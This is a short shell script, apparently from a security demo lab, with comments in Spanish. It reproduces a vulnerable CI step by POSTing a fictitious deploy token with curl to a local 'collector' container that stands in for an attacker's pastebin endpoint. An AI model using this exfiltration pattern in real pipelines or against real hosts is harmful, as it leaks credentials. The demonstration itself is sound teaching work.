#!/bin/sh
# Reproduce, palabra por palabra, el step "Reportar métricas de build" de
# vulnerable.yml -- pero apuntando a "collector" (el otro contenedor de este
# docker-compose) en vez de a pastebin.com, para no contactar ningún host
# real. El DEPLOY_TOKEN es un valor ficticio de ejemplo, no un secreto real.

set -x

DEPLOY_TOKEN="ghp_prodDeployToken789"

# Espera a que el receptor esté listo
until curl -s -o /dev/null "http://collector:8080/"; do
  sleep 0.5
done

echo ""
echo "### Ejecutando literalmente el curl de vulnerable.yml (apuntando al collector local) ###"
curl -X POST http://collector:8080/api/api_post.php -d "token=$DEPLOY_TOKEN"

echo ""
echo "### El secreto ha llegado al 'servidor del atacante' -- revisa los logs del servicio 'collector' ###"
